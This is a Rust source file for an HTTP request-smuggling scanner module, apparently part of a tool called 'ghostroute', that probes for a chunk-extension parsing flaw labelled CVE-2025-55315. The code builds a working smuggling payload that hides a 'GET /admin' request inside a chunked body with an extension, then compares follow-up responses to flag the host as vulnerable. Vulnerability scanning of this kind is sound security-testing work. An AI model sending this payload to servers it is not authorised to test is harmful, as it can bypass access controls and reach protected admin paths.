use crate::auth::AuthStore;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    _silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;

    // Chunk Extension smuggling (CVE-2025-55315):
    // Transfer-Encoding: chunked with extensions can confuse parsers
    let smuggled_req = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";

    // Build a chunked body with extension
    let mut chunked_body = Vec::new();
    // Chunk with extension: "5;ext=asdf\r\n" then data
    chunked_body.extend_from_slice(b"5;ext=asdf\r\n");
    chunked_body.extend_from_slice(b"HELLO\r\n");
    // Smuggled content as next chunk
    chunked_body.extend_from_slice(format!("{:x}\r\n", smuggled_req.len()).as_bytes());
    chunked_body.extend_from_slice(smuggled_req);
    chunked_body.extend_from_slice(b"\r\n");
    chunked_body.extend_from_slice(b"0\r\n\r\n");

    let mut request = format!(
        "POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\nUser-Agent: ghostroute/{}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
        host, env!("CARGO_PKG_VERSION")
    );

    if let Some(a) = auth {
        let mut bytes = request.into_bytes();
        a.apply_to_request(&mut bytes);
        request = String::from_utf8(bytes).map_err(|e| e.to_string())?;
    }

    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::time::timeout;
    use std::time::Duration;

    let mut conn = crate::net::connect(cfg).await?;
    conn.write_all(request.as_bytes()).await.ok();
    conn.write_all(&chunked_body).await.ok();

    let mut buf = Vec::with_capacity(4096);
    let mut tmp = [0u8; 8192];
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf.len() > 1_000_000 { break; }
        if buf.len() > 100 && buf.windows(4).any(|w| w == b"\r\n\r\n") { break; }
    }
    let _ = h1::parse_response(&buf);

    let second_req = h1::build_request("GET", "/", host, &[], b"");
    conn.write_all(&second_req).await.ok();

    let mut buf2 = Vec::with_capacity(4096);
    loop {
        match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf2.len() > 1_000_000 { break; }
    }

    let second_resp = h1::parse_response(&buf2).unwrap_or_else(|_| baseline.clone());
    let vulnerable = second_resp.body != baseline.body || second_resp.status_code != baseline.status_code;

    let host_name = &cfg.host;
    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "chunk-ext".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: None,
        status_code: second_resp.status_code,
        details: if vulnerable {
            Some("Chunk Extension (CVE-2025-55315): chunked with ext= parsed differently".into())
        } else {
            None
        },
        ..Default::default()
    })
}
